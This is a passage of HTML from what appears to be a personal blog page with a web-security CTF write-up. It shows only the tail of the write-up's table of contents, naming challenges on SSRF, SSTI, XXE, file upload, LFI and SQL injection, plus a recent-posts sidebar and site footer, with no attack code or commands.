class="toc-text">cmdi - blind</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-unserialize1"><span class="toc-number">17.</span> <span class="toc-text">php - unserialize1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf-warmup"><span class="toc-number">18.</span> <span class="toc-text">ssrf - warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf-bypass-1"><span class="toc-number">19.</span> <span class="toc-text">ssrf - bypass - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf-bypass-2"><span class="toc-number">20.</span> <span class="toc-text">ssrf - bypass - 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf-bypass-3"><span class="toc-number">21.</span> <span class="toc-text">ssrf - bypass - 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf-mysql"><span class="toc-number">22.</span> <span class="toc-text">ssrf - mysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti-warmup"><span class="toc-number">23.</span> <span class="toc-text">ssti - warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti-getshell"><span class="toc-number">24.</span> <span class="toc-text">ssti - getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe-warmup"><span class="toc-number">25.</span> <span class="toc-text">xxe - warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe-blind"><span class="toc-number">26.</span> <span class="toc-text">xxe - blind</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload-warmup"><span class="toc-number">27.</span> <span class="toc-text">upload - warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload-htaccess"><span class="toc-number">28.</span> <span class="toc-text">upload - htaccess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload-bypass-1"><span class="toc-number">29.</span> <span class="toc-text">upload - bypass 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-warmup"><span class="toc-number">30.</span> <span class="toc-text">xss - warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-gadget"><span class="toc-number">31.</span> <span class="toc-text">xss - gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-rand-1"><span class="toc-number">32.</span> <span class="toc-text">php - rand - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lfi-basic"><span class="toc-number">33.</span> <span class="toc-text">lfi - basic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lfi-basic-shell"><span class="toc-number">34.</span> <span class="toc-text">lfi - basic - shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nginx-chall-1"><span class="toc-number">35.</span> <span class="toc-text">nginx - chall - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-disable-functions-baby"><span class="toc-number">36.</span> <span class="toc-text">bypass_disable_functions - baby</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-disable-functions-nomail"><span class="toc-number">37.</span> <span class="toc-text">bypass_disable_functions - nomail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-open-basedir"><span class="toc-number">38.</span> <span class="toc-text">bypass open_basedir</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle"><span class="toc-number">39.</span> <span class="toc-text">pickle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-insert"><span class="toc-number">40.</span> <span class="toc-text">sqli - insert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-bypass1"><span class="toc-number">41.</span> <span class="toc-text">sqli - bypass1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-read-file"><span class="toc-number">42.</span> <span class="toc-text">sqli - read file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-write-file"><span class="toc-number">43.</span> <span class="toc-text">sqli - write file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby-web"><span class="toc-number">44.</span> <span class="toc-text">Baby web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#js-ser-1"><span class="toc-number">45.</span> <span class="toc-text">js - ser -1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pyformat"><span class="toc-number">46.</span> <span class="toc-text">pyformat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#todo-cmdi-blind-0ops-bypass-addslashes-ssrf-bypass-2-sqli-bypass1-ssrf-bypass-3-sqli-insert"><span class="toc-number">47.</span> <span class="toc-text">todo: cmdi - blind, 0ops, bypass addslashes?, ssrf - bypass - 2, sqli - bypass1, ssrf - bypass - 3, sqli - insert</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/27/20250927%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250927随缘刷题">20250927随缘刷题</a><time datetime="2025-09-27T04:45:15.000Z" title="发表于 2025-09-27 12:45:15">2025-09-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/19/20250919%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250919随缘刷题">20250919随缘刷题</a><time datetime="2025-09-19T14:11:53.000Z" title="发表于 2025-09-19 22:11:53">2025-09-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/16/20250916%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" title="20250916论文学习">20250916论文学习</a><time datetime="2025-09-16T07:49:01.000Z" title="发表于 2025-09-16 15:49:01">2025-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025/" title="湾区杯2025">湾区杯2025</a><time datetime="2025-09-08T00:47:34.000Z" title="发表于 2025-09-08 08:47:34">2025-09-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/06/ImaginaryCTF2025/" title="ImaginaryCTF2025">ImaginaryCTF2025</a><time datetime="2025-09-06T07:03:31.000Z" title="发表于 2025-09-06 15:03:31">2025-09-06</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/hk.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By cheng_xing</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>